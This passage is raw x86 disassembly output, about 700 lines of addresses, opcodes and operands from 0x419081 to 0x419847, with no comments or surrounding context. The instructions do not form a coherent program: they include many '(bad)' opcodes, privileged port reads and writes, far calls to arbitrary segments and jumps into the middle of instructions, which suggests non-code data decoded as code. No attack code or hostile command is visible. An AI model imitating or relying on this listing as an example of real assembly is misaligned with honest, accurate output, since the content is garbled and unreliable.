  419081:	lds    ecx,FWORD PTR [ebx+0x6680b14e]
  419087:	sub    al,0xb3
  419089:	jb     0x41905e
  41908b:	pop    ds
  41908c:	test   eax,0x64582b50
  419091:	sub    BYTE PTR [ecx-0x52],cl
  419094:	cmp    ebx,DWORD PTR [esi+ecx*1+0x4afecaed]
  41909b:	dec    edx
  41909c:	mov    ?,ecx
  41909e:	sbb    DWORD PTR [eax+0x8d9d946],0xc848ffd8
  4190a8:	pop    ebx
  4190a9:	cwde   
  4190aa:	cs repz jb 0x4190aa
  4190ae:	mov    ebx,0x32ab434c
  4190b3:	xchg   edx,eax
  4190b4:	xchg   esp,eax
  4190b5:	pop    esp
  4190b6:	sti    
  4190b7:	(bad)  
  4190b8:	mov    dh,0x87
  4190ba:	cmp    DWORD PTR [ecx+0x45be6ac5],esi
  4190c0:	adc    al,0x88
  4190c2:	pop    ebx
  4190c3:	and    eax,0x98b13351
  4190c8:	cmp    al,0xe9
  4190ca:	outs   dx,DWORD PTR ds:[esi]
  4190cb:	add    eax,0x5d83c4c3
  4190d0:	jmp    0x4190c7
  4190d2:	sar    BYTE PTR [edx-0x629632be],0x58
  4190d9:	test   BYTE PTR [ebx],bl
  4190db:	and    ah,cl
  4190dd:	repnz xchg esi,eax
  4190df:	mul    BYTE PTR [edi-0x2f]
  4190e2:	fisttp DWORD PTR [ebp-0x16320082]
  4190e8:	pop    ecx
  4190e9:	xchg   BYTE PTR [edi-0x3700dbe5],dl
  4190ef:	mov    al,ds:0x8fe6d78b
  4190f4:	outs   dx,DWORD PTR ds:[esi]
  4190f5:	(bad)  
  4190f6:	cs in  eax,0xe2
  4190f9:	pop    edx
  4190fa:	or     DWORD PTR [esp+ebx*4-0x76b0834f],0x7d35e3ee
  419105:	sub    al,0x38
  419107:	(bad)  
  419108:	std    
  419109:	iret   
  41910a:	lods   al,BYTE PTR ds:[esi]
  41910b:	pusha  
  41910c:	add    edx,DWORD PTR [edx]
  41910e:	sub    eax,0x7f0dc008
  419113:	test   al,0x88
  419115:	leave  
  419116:	gs mov esp,0x856c79b2
  41911c:	mov    edi,0x5c393649
  419121:	pop    ss
  419122:	and    eax,0xb81c4bca
  419127:	push   es
  419128:	dec    edi
  419129:	mov    ds:0x637da6ab,eax
  41912e:	jge    0x4190d8
  419130:	cmp    cl,BYTE PTR ds:0x868b434e
  419136:	lea    eax,[edi+0x32462a0d]
  41913c:	pop    esi
  41913d:	in     eax,dx
  41913e:	call   0x5601b049
  419143:	mov    al,0x2e
  419145:	adc    eax,0xb4026a0b
  41914a:	nop
  41914b:	(bad)  
  41914c:	out    0xc0,eax
  41914e:	inc    edx
  41914f:	rcr    BYTE PTR [edx+0x3],0xa9
  419153:	std    
  419154:	jle    0x4190de
  419156:	lods   al,BYTE PTR ds:[esi]
  419157:	mov    ds:0x2bd174e7,al
  41915c:	enter  0xff55,0xf4
  419160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419161:	push   0xba257de6
  419166:	push   esi
  419167:	sbb    cl,BYTE PTR [edi+0x5c]
  41916a:	dec    ebp
  41916b:	sub    BYTE PTR [ebx-0x798c3667],ch
  419171:	jo     0x419122
  419173:	xchg   edx,eax
  419174:	jle    0x41913d
  419176:	adc    al,0x9c
  419178:	push   esi
  419179:	dec    edi
  41917a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41917b:	fs and eax,0x9dd0bba4
  419181:	sar    edx,0xc5
  419184:	ss inc edi
  419186:	push   ecx
  419187:	call   0x1e7de221
  41918c:	sbb    eax,0x7a2a5100
  419191:	loop   0x41914e
  419193:	imul   edi,DWORD PTR [ebx-0x22cbb736],0xffffff86
  41919a:	xor    BYTE PTR [ecx+edi*1+0x5c5c7b2d],0x57
  4191a2:	lods   eax,DWORD PTR ds:[esi]
  4191a3:	mov    ch,0x92
  4191a5:	loope  0x419226
  4191a7:	imul   BYTE PTR [esi+0xa98ee79]
  4191ad:	jbe    0x4191bb
  4191af:	outs   dx,DWORD PTR ds:[esi]
  4191b0:	adc    bl,BYTE PTR [ebp+0x59497ff]
  4191b6:	push   edx
  4191b7:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4191b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191ba:	cmc    
  4191bb:	mov    bh,0x9b
  4191bd:	cdq    
  4191be:	xor    DWORD PTR [edi+0x22],ebp
  4191c1:	clc    
  4191c2:	sub    al,0x1b
  4191c4:	cmp    bl,BYTE PTR [edi-0x66]
  4191c7:	(bad)  
  4191c8:	shl    ch,1
  4191ca:	popa   
  4191cb:	push   esp
  4191cc:	pushf  
  4191cd:	push   ds
  4191ce:	out    0x9d,eax
  4191d0:	daa    
  4191d1:	and    BYTE PTR [ebx+0x292ff0a3],bh
  4191d7:	adc    DWORD PTR [edx-0x1e9a3218],ecx
  4191dd:	hlt    
  4191de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191df:	out    dx,al
  4191e0:	sbb    BYTE PTR [edi+0x59],dh
  4191e3:	jp     0x4191c4
  4191e5:	jle    0x4191a2
  4191e7:	mov    al,0x76
  4191e9:	les    ecx,FWORD PTR [edx+0x58]
  4191ec:	xor    BYTE PTR [ebp+0x6ab246da],0xb3
  4191f3:	loopne 0x4191ec
  4191f5:	stos   BYTE PTR es:[edi],al
  4191f6:	pop    edx
  4191f7:	cmc    
  4191f8:	jl     0x4191d4
  4191fa:	or     edx,DWORD PTR [esi-0x23]
  4191fd:	call   FWORD PTR [eax]
  4191ff:	mov    al,ds:0x118f32c4
  419204:	test   DWORD PTR [edi+0x1c],ebx
  419207:	dec    ebx
  419208:	and    BYTE PTR [ebp+0x17],ch
  41920b:	mov    ch,0xc9
  41920d:	cwde   
  41920e:	pop    ebp
  41920f:	cmp    ebp,DWORD PTR [ebp+0x190899a2]
  419215:	adc    DWORD PTR [edx+0x45],esp
  419218:	arpl   bp,si
  41921a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41921b:	pushf  
  41921c:	rcl    DWORD PTR [edx+0x1f],1
  41921f:	loope  0x419262
  419221:	fmul   DWORD PTR [eax-0x372e75d5]
  419227:	fisub  WORD PTR [ecx-0x362e5b28]
  41922d:	ret    
  41922e:	jno    0x4192ad
  419230:	mov    ebx,0x5f014241
  419235:	imul   cx,WORD PTR [ebx+ecx*4],0xa091
  41923b:	mov    edx,0xa0502284
  419240:	vpackssdw xmm5,xmm2,xmm6
  419244:	inc    edi
  419245:	inc    ebx
  419246:	adc    eax,0x452a18dd
  41924b:	sub    BYTE PTR ds:0xffe10ea8,al
  419251:	mov    bh,0x2c
  419253:	rep stos BYTE PTR es:[edi],al
  419255:	push   0xffffffc3
  419257:	push   cs
  419258:	mov    al,ds:0x11bf532
  41925d:	dec    edx
  41925e:	xor    edx,eax
  419260:	pop    edi
  419261:	cmp    eax,0xebbf4239
  419266:	cmp    BYTE PTR ds:0x8af6b5e0,bl
  41926c:	pop    ds
  41926d:	out    dx,al
  41926e:	stc    
  41926f:	jns    0x4191fb
  419271:	sbb    ch,ah
  419273:	xchg   ecx,eax
  419274:	jp     0x41922e
  419276:	lahf   
  419277:	(bad)  
  419279:	mov    cl,0x37
  41927b:	mov    es,WORD PTR [ecx-0x23]
  41927e:	and    ecx,0x14
  419281:	jge    0x419264
  419283:	mov    ah,0x2d
  419285:	fimul  WORD PTR [ebx-0x1a]
  419288:	push   ebx
  419289:	clc    
  41928a:	jo     0x419213
  41928c:	xchg   esp,eax
  41928d:	sub    ebx,eax
  41928f:	sbb    edi,DWORD PTR [edi-0x2f]
  419292:	jmp    0x4192ce
  419294:	or     DWORD PTR [edx+0x7a50898e],0x45
  41929b:	adc    ch,dl
  41929d:	into   
  41929e:	test   BYTE PTR [ecx-0x43ae314f],dl
  4192a4:	pop    es
  4192a5:	rcl    DWORD PTR [ebx],cl
  4192a7:	aaa    
  4192a8:	or     eax,0x368d3095
  4192ad:	inc    edi
  4192ae:	cmp    edi,DWORD PTR ds:0x9574ed50
  4192b4:	push   eax
  4192b5:	repnz sub al,0x78
  4192b8:	pop    esp
  4192b9:	push   ebp
  4192ba:	jecxz  0x419323
  4192bc:	push   edi
  4192bd:	cmp    BYTE PTR ds:[edx],ch
  4192c0:	sub    BYTE PTR fs:[ebp-0x11],ah
  4192c4:	imul   ebx,DWORD PTR [eax-0x3e],0xffffffc3
  4192c8:	cmc    
  4192c9:	push   es
  4192ca:	test   eax,0x5c783b5f
  4192cf:	cwde   
  4192d0:	icebp  
  4192d1:	and    DWORD PTR fs:[ecx],eax
  4192d4:	shl    DWORD PTR [ecx-0x6e],1
  4192d7:	sar    DWORD PTR [edx+0xc],1
  4192da:	dec    ebx
  4192db:	repnz sbb al,0xb4
  4192de:	iret   
  4192df:	std    
  4192e0:	in     eax,dx
  4192e1:	xlat   BYTE PTR ds:[ebx]
  4192e2:	mov    ss,WORD PTR [ebx-0x1a60ed3c]
  4192e8:	out    0x8e,al
  4192ea:	or     BYTE PTR [edi+0x39],dl
  4192ed:	popf   
  4192ee:	fnsave [edi]
  4192f0:	test   bl,0xc6
  4192f3:	adc    al,BYTE PTR [edi]
  4192f5:	(bad)  [eax-0x38eeb2fb]
  4192fb:	arpl   WORD PTR [esi+0x5],dx
  4192fe:	or     DWORD PTR [ecx+0x6b],ebx
  419301:	dec    esi
  419302:	jno    0x419305
  419304:	rol    edx,0x6e
  419307:	nop
  419308:	or     dh,bh
  41930a:	jbe    0x41937c
  41930c:	ret    
  41930d:	or     DWORD PTR [esi-0x7c],ebx
  419310:	lock add bl,BYTE PTR fs:[edx]
  419314:	lea    eax,[eax+0x8011e6b]
  41931a:	data16 (bad) 
  41931c:	xchg   esp,eax
  41931d:	jnp    0x4192ad
  41931f:	jns    0x41937e
  419321:	retf   
  419322:	arpl   WORD PTR [ebx-0x7d],bp
  419325:	xor    esi,DWORD PTR [ecx]
  419327:	das    
  419328:	mov    esp,0x7983dda8
  41932d:	xchg   ecx,eax
  41932e:	(bad)  
  41932f:	dec    ebx
  419330:	xchg   ecx,eax
  419331:	jecxz  0x4192dd
  419333:	cmp    dh,ch
  419335:	xor    al,0xdb
  419337:	int3   
  419338:	mov    BYTE PTR [ebx],ch
  41933a:	xchg   edi,eax
  41933b:	sub    BYTE PTR [ebp-0x59],dh
  41933e:	je     0x41935c
  419340:	repnz inc esp
  419342:	addr16 out dx,al
  419344:	pop    ss
  419345:	mov    ds:0x8cb2e045,eax
  41934a:	lahf   
  41934b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41934c:	push   0x11
  41934e:	mov    al,0x6a
  419350:	mov    BYTE PTR [ebp+0x134fd4e1],dl
  419356:	adc    eax,0x76a640cf
  41935b:	push   cs
  41935c:	sbb    eax,0x9c31068d
  419361:	mov    al,ds:0xa709600b
  419366:	inc    ebx
  419367:	dec    esp
  419368:	gs jb  0x4193ad
  41936b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41936c:	mov    DWORD PTR [edi+0x30d4ffad],edi
  419372:	addr16 mov ds:0xdbbe,eax
  419376:	mov    al,ds:0x54666976
  41937b:	sbb    ch,BYTE PTR [esi]
  41937d:	imul   edx,DWORD PTR [ebp-0x38d089e3],0xffffffaa
  419384:	cdq    
  419385:	lds    edx,FWORD PTR [edx-0x72abef6c]
  41938b:	lds    ebx,FWORD PTR [esi]
  41938d:	pslld  mm2,mm1
  419390:	dec    edx
  419391:	cmp    al,al
  419393:	adc    al,0x5f
  419395:	sub    edi,ebx
  419397:	repz (bad) [edi-0xa]
  41939b:	xchg   edi,eax
  41939c:	out    0x2,eax
  41939e:	repnz add eax,0x3db7ef09
  4193a4:	sbb    DWORD PTR [eax-0x16],ebx
  4193a7:	add    al,0xaf
  4193a9:	imul   esp,DWORD PTR [esi+0x76],0xffffffe7
  4193ad:	jo     0x419385
  4193af:	(bad)  
  4193b1:	jle    0x419402
  4193b3:	cmp    al,BYTE PTR [eax+0x76604699]
  4193b9:	add    BYTE PTR [esi],bh
  4193bb:	jg     0x4193dc
  4193bd:	in     al,dx
  4193be:	inc    edi
  4193bf:	sar    edi,cl
  4193c1:	ins    DWORD PTR es:[edi],dx
  4193c2:	lock fnstenv [ebx]
  4193c5:	jno    0x41943f
  4193c7:	mov    eax,0xf6d45d93
  4193cd:	je     0x41939c
  4193cf:	sub    al,0x6f
  4193d1:	add    al,0x3f
  4193d3:	and    dh,bh
  4193d5:	dec    edi
  4193d6:	and    al,0xe8
  4193d8:	dec    ebp
  4193d9:	lods   eax,DWORD PTR ds:[esi]
  4193da:	sub    eax,0x32144a11
  4193df:	sahf   
  4193e0:	icebp  
  4193e1:	or     bl,al
  4193e3:	ss xchg ebp,eax
  4193e5:	and    ch,BYTE PTR [ebx]
  4193e7:	es stos DWORD PTR es:[edi],eax
  4193e9:	je     0x4193b9
  4193eb:	ret    
  4193ec:	adc    eax,0x74aa8c67
  4193f1:	lock (bad) 
  4193f3:	push   eax
  4193f4:	xchg   ecx,eax
  4193f5:	retf   
  4193f6:	mov    cl,0xdd
  4193f8:	mov    al,0x81
  4193fa:	int    0xa7
  4193fc:	leave  
  4193fd:	xor    al,0x90
  4193ff:	shl    edi,0x4c
  419402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419403:	cmp    al,BYTE PTR [ebx+0x5f40c8a6]
  419409:	mov    ecx,0xab7595ea
  41940e:	push   ebp
  41940f:	xor    edi,esi
  419411:	inc    ebx
  419412:	push   ss
  419413:	push   es
  419414:	loop   0x419494
  419416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419417:	out    0xe7,eax
  419419:	xchg   edx,eax
  41941a:	test   BYTE PTR [edi],bl
  41941c:	fist   DWORD PTR [ebx-0x1e]
  41941f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419420:	sub    bl,al
  419422:	fldlg2 
  419424:	jmp    DWORD PTR [edi+eiz*2+0x2bdd9591]
  41942b:	into   
  41942c:	mov    ebx,0xb820a1cd
  419431:	push   edx
  419432:	int3   
  419433:	outs   dx,DWORD PTR ds:[esi]
  419434:	in     al,dx
  419435:	sub    BYTE PTR [ecx-0x51e88ed1],dh
  41943b:	adc    BYTE PTR [esi+0x6f],al
  41943e:	in     eax,dx
  41943f:	adc    BYTE PTR [ecx],ch
  419441:	push   ebp
  419442:	bswap  eax
  419444:	pop    ds
  419445:	les    ebp,FWORD PTR [edi-0x666a1157]
  41944b:	mov    ah,0xf9
  41944d:	addr16 aas 
  41944f:	fwait
  419450:	pop    esi
  419451:	call   0x816:0x39dba654
  419458:	cs lock inc ecx
  41945b:	cmp    DWORD PTR [edi+0x2c],ecx
  41945e:	rcl    BYTE PTR [esi],cl
  419460:	imul   ecx,DWORD PTR [eax-0x464d604f],0xfbd85aa7
  41946a:	mov    ecx,0x70107ae0
  41946f:	test   BYTE PTR [edi+edi*2+0x55],ch
  419473:	sbb    al,0x2f
  419475:	stc    
  419476:	jb     0x419400
  419478:	call   0x87fa7d23
  41947d:	add    BYTE PTR [edi],0x7f
  419480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419481:	fnstsw WORD PTR [eax]
  419483:	and    dh,BYTE PTR [edx]
  419485:	out    dx,eax
  419486:	ret    
  419487:	pop    ebp
  419488:	shl    DWORD PTR [eax],1
  41948a:	mov    esi,fs
  41948c:	xor    eax,0xf488b0ea
  419491:	and    BYTE PTR [esi-0x39],cl
  419494:	dec    ecx
  419495:	mov    dl,0x3
  419497:	sub    BYTE PTR [esi+0x4fcd3c03],cl
  41949d:	sbb    eax,0x6f704bf7
  4194a2:	xchg   ebx,eax
  4194a3:	mov    al,BYTE PTR [esp+0x6e]
  4194a7:	and    esp,DWORD PTR [eax]
  4194a9:	js     0x4194bd
  4194ab:	add    bl,BYTE PTR [edi]
  4194ad:	pop    esi
  4194ae:	ror    BYTE PTR [edi],cl
  4194b0:	neg    ah
  4194b2:	retf   
  4194b3:	push   0xffffffe8
  4194b5:	and    esp,esi
  4194b7:	sub    DWORD PTR [esi-0x66],0xffffffc1
  4194bb:	call   0x6b61ac5d
  4194c0:	mov    ds:0xe99c8b74,eax
  4194c5:	xchg   edi,eax
  4194c6:	push   esi
  4194c7:	push   edx
  4194c8:	lahf   
  4194c9:	pop    edx
  4194ca:	inc    edi
  4194cb:	inc    ebx
  4194cc:	xchg   esi,eax
  4194cd:	mov    esi,0x571a8473
  4194d2:	fs in  al,dx
  4194d4:	pop    ss
  4194d5:	daa    
  4194d6:	push   esp
  4194d7:	ds in  eax,dx
  4194d9:	pop    edx
  4194da:	scas   al,BYTE PTR es:[edi]
  4194db:	and    al,0x2c
  4194dd:	not    BYTE PTR ds:0x3ece6813
  4194e3:	xchg   ebx,eax
  4194e4:	mov    dh,0x78
  4194e6:	stc    
  4194e7:	lea    edx,[edx+0x54e68f30]
  4194ed:	push   0x256ca8e5
  4194f2:	test   BYTE PTR [ebp+0x25],ch
  4194f5:	mov    ah,0x7d
  4194f7:	sbb    al,0xe6
  4194f9:	ins    BYTE PTR es:[edi],dx
  4194fa:	or     eax,0x8ddb8187
  4194ff:	push   edx
  419500:	leave  
  419501:	call   FWORD PTR [esi+0x73]
  419504:	scas   eax,DWORD PTR es:[edi]
  419505:	xor    esp,DWORD PTR [esi-0x48a2e1a0]
  41950b:	imul   ebx,DWORD PTR [ecx],0xb9c7bc9c
  419511:	rcr    DWORD PTR [esi+0x59e2453b],1
  419517:	sbb    eax,DWORD PTR [eax+0x28]
  41951a:	call   0x54d3fe10
  41951f:	pop    es
  419520:	out    0x93,eax
  419522:	or     eax,0xf500b63d
  419527:	dec    esp
  419528:	or     DWORD PTR [esi],ebp
  41952a:	iret   
  41952b:	psrlw  mm2,mm1
  41952e:	push   ss
  41952f:	pop    ds
  419530:	mov    edx,0x28aa51f4
  419535:	stos   DWORD PTR es:[edi],eax
  419536:	js     0x41955e
  419538:	mov    ecx,0xb6506a86
  41953d:	das    
  41953e:	pop    esi
  41953f:	inc    ebx
  419540:	cmc    
  419541:	fadd   st,st(6)
  419543:	dec    ebp
  419544:	dec    ecx
  419545:	daa    
  419546:	mov    al,ds:0xe4671602
  41954b:	(bad)
  419550:	mov    WORD PTR [ebx+0x71],ds
  419553:	jne    0x419508
  419555:	and    ecx,DWORD PTR [ecx+0x70b0998b]
  41955b:	xchg   ebp,eax
  41955d:	dec    ecx
  41955e:	mov    ecx,cs
  419560:	dec    esi
  419561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419562:	imul   eax,DWORD PTR [edx+0x6950133d],0x6be19392
  41956c:	lahf   
  41956d:	and    ebp,DWORD PTR [eax]
  41956f:	stos   BYTE PTR es:[edi],al
  419570:	outs   dx,BYTE PTR ds:[esi]
  419571:	dec    ebp
  419572:	push   ebp
  419573:	sub    DWORD PTR [ebx+0x14],edx
  419576:	sti    
  419577:	pop    esp
  419578:	out    dx,al
  419579:	loop   0x4195c4
  41957b:	mov    WORD PTR [edx+0x70],fs
  41957e:	out    dx,al
  41957f:	gs pop ss
  419581:	sqrtps xmm1,XMMWORD PTR [ebp+0x34]
  419585:	jmp    FWORD PTR [ebx-0x53]
  419588:	inc    BYTE PTR [esi-0x8]
  41958b:	sub    BYTE PTR [ecx],ch
  41958d:	push   0xffffffc8
  41958f:	mov    ah,0xa0
  419591:	mov    ds:0xe148c7fb,eax
  419596:	dec    ecx
  419597:	xor    eax,0x362fca5a
  41959c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41959d:	xchg   esi,eax
  41959e:	lea    eax,[edx-0x30]
  4195a1:	dec    ecx
  4195a2:	push   ecx
  4195a3:	mov    ch,0x4e
  4195a5:	sub    ebx,DWORD PTR ds:[ebx-0xd81c399]
  4195ac:	gs call 0xa2ad:0x8070941e
  4195b4:	addr16 loopne 0x419627
  4195b7:	pop    ecx
  4195b8:	popf   
  4195b9:	mov    esi,0xa1cd7d02
  4195be:	lea    ebp,[edi-0x2a83466d]
  4195c4:	sbb    bl,al
  4195c6:	fs pop esi
  4195c8:	lds    esp,FWORD PTR [ebx]
  4195ca:	sbb    eax,0x97ce704b
  4195cf:	ins    BYTE PTR es:[edi],dx
  4195d0:	push   eax
  4195d1:	jae    0x419567
  4195d3:	nop
  4195d4:	iret   
  4195d5:	imul   DWORD PTR [ebx+0x6d]
  4195d8:	push   edx
  4195d9:	dec    ebp
  4195da:	std    
  4195db:	add    ah,dh
  4195dd:	outs   dx,DWORD PTR ds:[esi]
  4195de:	adc    ch,BYTE PTR [ecx+0x77]
  4195e1:	add    DWORD PTR [eax-0x5ac24c46],edx
  4195e7:	icebp  
  4195e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195e9:	mov    cl,0x1e
  4195eb:	fstp   DWORD PTR [ebp+0x4ccb65ef]
  4195f1:	out    0x1b,eax
  4195f3:	and    ah,dh
  4195f5:	test   DWORD PTR [ecx-0x884179d],esp
  4195fb:	jb     0x41963b
  4195fd:	aad    0xd7
  4195ff:	jg     0x419611
  419601:	inc    esp
  419602:	call   0xe8b9:0xd4297c3f
  419609:	push   eax
  41960a:	cli    
  41960b:	daa    
  41960c:	cdq    
  41960d:	bswap  eax
  41960f:	xor    dl,dh
  419611:	shr    BYTE PTR cs:[eax+0x6edea3f3],0x21
  419619:	imul   DWORD PTR fs:[ebx]
  41961c:	int    0x7b
  41961e:	mov    edx,0x872d25de
  419623:	ins    DWORD PTR es:[edi],dx
  419624:	in     eax,0xd4
  419626:	shl    BYTE PTR [esi],cl
  419628:	adc    BYTE PTR [ebx],dh
  41962a:	(bad)  
  41962b:	sbb    edx,esi
  41962d:	jns    0x419691
  41962f:	or     eax,0xb1d2aa52
  419634:	sub    al,0x57
  419636:	lds    ecx,FWORD PTR fs:0x4b0fd9a2
  41963d:	(bad)  
  41963f:	das    
  419640:	xor    ah,dl
  419642:	lahf   
  419643:	(bad)  
  419645:	fmul   QWORD PTR [ecx+0x6c0f06e5]
  41964b:	repz repz out dx,eax
  41964e:	add    DWORD PTR [esi+0x505c9021],eax
  419654:	addr16 rcl ah,1
  419657:	mov    eax,DWORD PTR [ecx]
  419659:	daa    
  41965a:	(bad)  
  41965b:	mov    edx,DWORD PTR [edx+0x46]
  41965e:	pop    es
  41965f:	or     cl,BYTE PTR [ecx+0x2de3ce92]
  419665:	sub    ah,BYTE PTR [edx]
  419667:	dec    ebp
  419668:	test   eax,0x5af05d0f
  41966d:	mov    esi,0x35d2d98
  419672:	shl    cl,1
  419674:	in     al,dx
  419675:	jno    0x41966f
  419677:	inc    esi
  419678:	mov    BYTE PTR [edx-0x5a],dh
  41967b:	lea    edi,[ebx]
  41967d:	call   0x924f:0xceef1bf
  419684:	mov    dh,0xb4
  419686:	sar    esp,cl
  419688:	dec    ecx
  419689:	sub    ah,cl
  41968b:	jo     0x4196c3
  41968d:	pop    ebx
  41968e:	les    ebx,FWORD PTR [ebp-0xbf4da9f]
  419694:	jl     0x4196a8
  419696:	leave  
  419697:	daa    
  419698:	push   ecx
  419699:	inc    ebx
  41969a:	inc    ebx
  41969b:	into   
  41969c:	push   ebx
  41969d:	in     eax,0xf2
  41969f:	mov    bh,0x7e
  4196a1:	das    
  4196a2:	popf   
  4196a3:	pop    es
  4196a4:	pusha  
  4196a5:	fcom   QWORD PTR [edx-0x51]
  4196a8:	adc    al,0xd8
  4196aa:	xchg   BYTE PTR [edi],dh
  4196ac:	push   es
  4196ad:	ror    ecx,cl
  4196af:	in     eax,0x93
  4196b1:	jg     0x41963c
  4196b3:	dec    esp
  4196b4:	push   edi
  4196b5:	pop    eax
  4196b6:	ficomp WORD PTR [esi-0x32]
  4196b9:	iret   
  4196ba:	jmp    0x8df003a7
  4196bf:	int    0xd0
  4196c1:	jne    0x4196e6
  4196c3:	bts    DWORD PTR [ebx],esi
  4196c6:	mov    ebp,0x48bab6e
  4196cb:	push   esp
  4196cc:	push   0xffffffb6
  4196ce:	mov    bl,0xd4
  4196d0:	imul   eax,DWORD PTR [esi+0x49],0x60
  4196d4:	jl     0x419742
  4196d6:	dec    edx
  4196d7:	mov    ah,0xa6
  4196d9:	and    DWORD PTR [eax+0x6feb65ab],ebp
  4196df:	fucom  st(0)
  4196e1:	adc    eax,0x5e1218f0
  4196e6:	pop    eax
  4196e7:	and    edx,edi
  4196e9:	cmp    edi,ebp
  4196eb:	hlt    
  4196ec:	pop    esp
  4196ed:	push   edx
  4196ee:	pusha  
  4196ef:	push   0x9631d3e4
  4196f4:	or     ecx,esp
  4196f6:	push   ecx
  4196f7:	jns    0x419713
  4196f9:	inc    eax
  4196fa:	out    dx,eax
  4196fb:	mov    eax,ds:0xba123294
  419700:	pop    es
  419701:	call   DWORD PTR [ebx]
  419703:	xchg   ebp,eax
  419704:	test   al,0x31
  419706:	jge    0x4196fd
  419708:	dec    ebx
  419709:	ins    BYTE PTR es:[edi],dx
  41970a:	shl    BYTE PTR [edx],1
  41970c:	out    dx,al
  41970d:	mov    ch,0xad
  41970f:	ja     0x4196e9
  419711:	adc    edx,edx
  419713:	xchg   ebp,eax
  419714:	in     eax,dx
  419715:	mov    al,dh
  419717:	xor    ecx,DWORD PTR [ecx]
  419719:	lahf   
  41971a:	jl     0x419735
  41971c:	push   edx
  41971d:	call   0x2da1fe93
  419722:	rol    BYTE PTR [esi],1
  419724:	jmp    0x1b9238ad
  419729:	mov    ah,0x33
  41972b:	mov    ds:0x1460c860,eax
  419730:	jns    0x419761
  419732:	bound  edi,QWORD PTR [esi+0x7a]
  419735:	fst    QWORD PTR [ebx-0x7ad58815]
  41973b:	xor    eax,0x1c657e6f
  419740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419741:	sbb    al,0xa7
  419743:	leave  
  419744:	mov    ds:0x6baddf8b,al
  419749:	xchg   esi,eax
  41974a:	pop    ss
  41974b:	push   ebx
  41974c:	cmc    
  41974d:	call   0x464f:0x21858537
  419754:	xor    esi,DWORD PTR [eax+0x74]
  419757:	sbb    ebx,ebx
  419759:	scas   al,BYTE PTR es:[edi]
  41975a:	scas   eax,DWORD PTR es:[edi]
  41975b:	or     eax,0x3919c2f6
  419760:	xchg   ebp,eax
  419761:	inc    esi
  419762:	call   0x21dbac9e
  419767:	push   ecx
  419768:	sub    DWORD PTR [edx-0x208cd97d],eax
  41976e:	into   
  41976f:	hlt    
  419770:	addr16 push ecx
  419772:	push   eax
  419773:	mov    eax,DWORD PTR [edx]
  419775:	ret    
  419776:	aas    
  419777:	jg     0x419785
  419779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41977a:	ja     0x4197b9
  41977c:	ret    0x239a
  41977f:	into   
  419780:	(bad)  
  419781:	hlt    
  419782:	push   cs
  419783:	jb     0x419756
  419785:	or     ah,0xa9
  419788:	mov    bl,0x23
  41978a:	add    DWORD PTR [esp+ecx*8],eax
  41978d:	popf   
  41978e:	mov    al,0x69
  419790:	in     eax,dx
  419791:	xchg   esi,eax
  419792:	call   0xb07aa25
  419797:	aas    
  419798:	scas   al,BYTE PTR es:[edi]
  419799:	xchg   ch,dh
  41979b:	dec    esi
  41979c:	mov    edx,0x72c8f0dc
  4197a1:	jbe    0x419760
  4197a3:	cmp    al,0xe
  4197a5:	fild   DWORD PTR ds:0x7a26524b
  4197ab:	ret    0x147f
  4197ae:	dec    edi
  4197af:	add    BYTE PTR [ecx-0x3d],ah
  4197b2:	lds    ebx,FWORD PTR [esi]
  4197b4:	push   esp
  4197b5:	leave  
  4197b6:	cs jbe 0x4197d9
  4197b9:	leave  
  4197ba:	mov    ?,WORD PTR [esi-0x77]
  4197bd:	xor    edx,esp
  4197bf:	dec    BYTE PTR [ebp+eax*1-0x36bd7c55]
  4197c6:	test   BYTE PTR [eax],al
  4197c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197c9:	leave  
  4197ca:	xchg   edi,eax
  4197cb:	cmp    ecx,ebp
  4197cd:	push   edi
  4197ce:	lods   eax,DWORD PTR ds:[esi]
  4197cf:	pop    ecx
  4197d0:	mov    ebp,DWORD PTR [esi-0x5a]
  4197d3:	inc    edi
  4197d4:	jo     0x41978e
  4197d6:	lds    edi,FWORD PTR [edx-0x65]
  4197d9:	addr16 jno 0x41982e
  4197dc:	inc    esp
  4197dd:	fwait
  4197de:	out    0x76,al
  4197e0:	jg     0x4197c5
  4197e2:	inc    esi
  4197e3:	push   esi
  4197e4:	in     eax,0xf5
  4197e6:	imul   esi,DWORD PTR [edi+0x7d3ac2c4],0x75b1b11d
  4197f0:	sahf   
  4197f1:	mov    edx,0x1e1a324b
  4197f6:	call   0xd198:0x6c48f183
  4197fd:	or     al,0x89
  4197ff:	xchg   edx,eax
  419800:	push   edx
  419801:	leave  
  419802:	dec    ecx
  419803:	dec    ecx
  419804:	jge    0x419879
  419806:	inc    edx
  419807:	test   eax,0xb119f171
  41980c:	inc    DWORD PTR ds:0x9e0c1e0
  419812:	pop    ecx
  419813:	loope  0x419797
  419815:	xrelease mov DWORD PTR [edi+0x44ae0fd5],eax
  41981c:	ss clc 
  41981e:	aaa    
  41981f:	pop    ss
  419820:	inc    ebp
  419821:	inc    edi
  419822:	cmp    eax,0x5e055abf
  419827:	fist   DWORD PTR [esi+0x5b]
  41982a:	ins    BYTE PTR es:[edi],dx
  41982b:	lods   eax,DWORD PTR ds:[esi]
  41982c:	adc    ah,BYTE PTR [edi+0x58]
  41982f:	call   0xf004:0x1e5ded4d
  419836:	sub    ebp,DWORD PTR [edi+ecx*4-0x5b]
  41983a:	pop    es
  41983b:	hlt    
  41983c:	push   0x68
  41983e:	das    
  41983f:	inc    esp
  419840:	mov    esp,0xd17dadd8
  419845:	shl    cl,1
  419847:	pop    edx
